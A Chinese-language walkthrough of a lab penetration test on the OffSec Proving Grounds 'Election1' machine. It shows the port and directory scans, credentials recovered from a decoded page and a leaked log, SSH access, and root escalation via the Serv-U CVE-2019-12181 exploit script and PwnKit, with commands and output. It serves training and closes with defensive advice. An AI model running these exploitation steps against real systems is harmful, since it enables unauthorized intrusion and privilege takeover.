# Election1 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-06-27

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (RustScan)
使用 RustScan 快速定位開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.236.211 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 | 遠端管理，可能用於後續憑證登入。 |
| 80/tcp     | HTTP         | Apache httpd 2.4.29 | 網頁服務，潛在主要攻擊進入點。 |

---

### 🌐 網頁服務列舉 (Web Enumeration)
*對 80 等網頁連接埠進行深入探測。*

#### 📁 目錄爆破 (Feroxbuster / Gobuster)
- **從根目錄開始爆破，找到 `phpinfo.php`、`robots.txt`**：
	```bash
	┌──(kali㉿kali)-[~/Downloads]
	└─$ feroxbuster -u http://192.168.236.211/ -w /usr/share/wordlists/dirb/common.txt -x php -s 200 -t 50 -d 2
	
	200      GET     1170l     5860w    95440c http://192.168.236.211/phpinfo.php
	200      GET        4l        4w       30c http://192.168.236.211/robots.txt
	200      GET       26l      359w    10531c http://192.168.236.211/phpmyadmin/index.php
	```

	![](image/Pasted%20image%2020260618002616.png)

	![](image/Pasted%20image%2020260618002737.png)

- **在 `robots.txt` 裡找到其中一個目錄 `/election`，從這個目錄繼續嘗試爆破，且因為有找到 `phpinfo.php`，所以指定副檔名 `.php`，`-d 2` 限制只爆破到目錄第 2 層**：
	
	![](image/Pasted%20image%2020260618002858.png)

	```bash
	┌──(kali㉿kali)-[~/Downloads]
	└─$ feroxbuster -u http://192.168.236.211/election/ -w /usr/share/wordlists/dirb/common.txt -x php -s 200 -t 50 -d 2
	
	200      GET        1l      215w     1935c http://192.168.236.211/election/card.php
	200      GET      129l      805w     8964c http://192.168.236.211/election/admin/index.php
	```

	![](image/Pasted%20image%2020260618003621.png)

	![](image/Pasted%20image%2020260618003656.png)

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
- **發現點 A**：存取網頁的 `/election/card.php` 頁面顯示了一串二進位資料。
- **發現點 B**：`/election/admin/` 後台需要管理員登入憑證。
- **分析思路**：可以嘗試將二進位資料進行解碼，看看是否為管理員帳號密碼。

---

### 🔑 初始存取突破 (Exploitation)

1. **二進位資料轉換**：
   將 `card.php` 所得到的二進位資料，進行兩次解碼轉換後，成功取得一組憑證：
   
   ![](image/Pasted%20image%2020260620023412.png)
   
   > [!key] **第一階段 Web 後台憑證**
   > *   **Username**: `user:1234` （或帳號為 `1234`）
   > *   **Password / Hash**: `Zxc123!@#`
   > *   **來源**：`card.php` 二進位解碼

2. **登入 Web 後台**：
   使用取得的憑證成功登入 `/election/admin/index.php` 管理頁面：
   
   ![](image/Pasted%20image%2020260620024022.png)

3. **尋獲系統日誌中的敏感資訊**：
   在 `Settings` > `System Info` > `Logging` 裡找到 `system.log`，點開後發現其中洩漏了 SSH 登入憑證：
   
   ![](image/Pasted%20image%2020260620025638.png)
   
   ![](image/Pasted%20image%2020260620025815.png)

   > [!key] **第二階段 SSH 系統憑證**
   > *   **Username**: `love`
   > *   **Password**: `P@$$w0rd@123`
   > *   **來源**：`system.log` 敏感資訊洩漏

4. **取得初始 Shell**：
   - 使用 `nxc` 驗證，確認此組憑證可成功進行 `ssh` 登入：
     ```bash
     ┌──(kali㉿kali)-[~]
     └─$ nxc ssh 192.168.202.211 -u love -p 'P@$$w0rd@123'
     SSH         192.168.202.211 22     192.168.202.211  [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
     SSH         192.168.202.211 22     192.168.202.211  [+] love:P@$$w0rd@123  Linux - Shell access!
     ```
   - 使用 `ssh` 登入系統並取得 `local.txt` (User Flag)：
     ```bash
     ┌──(kali㉿kali)-[~]
     └─$ ssh love@192.168.202.211
     love@election:~$ whoami
     love
     love@election:~$ find / -type f -name local.txt 2>/dev/null
     /home/love/local.txt
     ```

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
上傳並執行 `linpeas.sh` 進行本機列舉，發現以下有趣的 SUID 檔案：
```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)

-rwsr-xr-x 1 root root 6.1M Nov 29  2017 /usr/local/Serv-U  --->  FTP_Server<15.1.7(CVE-2019-12181)/Serv-U
```

---

### 👑 提權利用 (Exploitation to Root)

1. **漏洞點**：`Serv-U FTP Server < 15.1.7` 存在本地提權漏洞（CVE-2019-12181）。
2. **尋找 Exploit**：
   使用 `searchsploit` 搜尋 `Serv-U`：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop]
   └─$ searchsploit Serv-U
   ------------------------------------------- ---------------------------------
    Exploit Title                             |  Path
   ------------------------------------------- ---------------------------------
   Serv-U FTP Server < 15.1.7 - Local Privile | linux/local/47009.c
   Serv-U FTP Server < 15.1.7 - Local Privile | multiple/local/47173.sh
   ------------------------------------------- ---------------------------------
   ```
3. **複製並執行 Exploit**：
   將 `47173.sh` 複製至本機並下載至靶機執行：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop]
   └─$ searchsploit -m 47173             
     Exploit: Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)
     Copied to: /home/kali/Desktop/47173.sh
   ```
   在目標機器執行：
   ```bash
   love@election:~$ chmod +x 47173.sh
   love@election:~$ ./47173.sh
   [*] Launching Serv-U ...
   sh: 1: : Permission denied
   [+] Success:
   -rwsr-xr-x 1 root root 1113504 Jun 20 01:15 /tmp/sh
   [*] Launching root shell: /tmp/sh
   sh-4.4# whoami
   root
   sh-4.4# find / -type f -name proof.txt 2>/dev/null
   /root/proof.txt
   ```
   成功取得 root 權限。

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **為什麼這個漏洞會存在？**
   - **敏感資訊洩漏**：系統將重要憑證寫在 `system.log` 中且管理介面可輕易查閱，使攻擊者能擴展權限至系統使用者。
   - **未修補的 SUID 服務**：系統內安裝了過舊且具 SUID 權限的 `Serv-U` 服務，直接導致了本地提權。
2. **安全防禦建議：**
   - 應避免在系統日誌或任何公開/半公開介面中儲存或顯示純文字密碼。
   - 移除不必要的 SUID 二進位檔案，或將 `Serv-U` 等服務升級至安全版本。

---

## 📝 5. 補充資訊

### 1. 其他掃描與潛在漏洞 (linpeas 結果)
*   **Dirty Frag (CVE-2026-43284 / CVE-2026-43500)**
*   **Copy Fail (CVE-2026-31431)**
*   **PackageKit Pack2TheRoot (CVE-2026-41651)** (PackageKit 版本 1.1.9)
*   **Polkit (CVE-2021-4034 - PwnKit)**

### 2. 替代提權方式：PwnKit
除了 Serv-U 外，也可以直接使用 `PwnKit` 本地提權漏洞獲取 root：
```bash
love@election:~$ chmod +x PwnKit
love@election:~$ ./PwnKit
root@election:/home/love# whoami
root
```
